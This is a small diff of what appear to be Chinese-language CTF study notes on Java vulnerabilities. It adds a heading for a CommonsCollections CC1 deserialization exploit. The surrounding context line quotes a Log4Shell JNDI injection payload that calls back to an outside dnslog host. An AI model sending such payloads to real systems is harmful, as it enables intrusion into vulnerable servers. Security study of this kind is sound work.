@@ -531,4 +531,7 @@ ${jndi:ldap://wffsr5.dnslog.cn:9999}
 
 ## java反序列化
 #java反序列化 
+
+### CommonsCollections篇(一) CC1链手写EXP
+
 ### web846
